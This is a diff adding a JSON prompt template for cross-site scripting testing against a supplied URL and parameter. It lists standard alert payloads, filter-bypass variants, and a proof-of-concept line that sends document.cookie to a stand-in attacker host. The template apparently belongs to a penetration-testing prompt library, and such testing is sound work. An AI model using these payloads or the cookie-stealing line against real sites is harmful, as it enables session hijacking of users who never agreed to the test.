@@ -1,0 +1,10 @@
+{
+  "name": "XSS Testing",
+  "description": "Cross-site scripting testing and exploitation",
+  "category": "web",
+  "variables": [
+    "url",
+    "parameter"
+  ],
+  "content": "Test XSS vulnerabilities at {url} in parameter {parameter}.\n\nTypes to test :\n1. Reflected XSS\n2. Stored XSS\n3. DOM-based XSS\n\nBasic payloads :\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"><script>alert(1)</script>\njAvAsCrIpT:alert(1)\n```\n\nFilter bypass :\n```html\n<img src=x onerror=alert`1`>\n<svg/onload=alert(1)>\n<body onpageshow=alert(1)>\n```\n\nFor a concrete proof of concept :\n```javascript\nfetch('https://attacker.com/steal?c='+document.cookie)\n```\n\nAnalyze the injection context (HTML, attribute, JavaScript) and adapt the payload."
+}
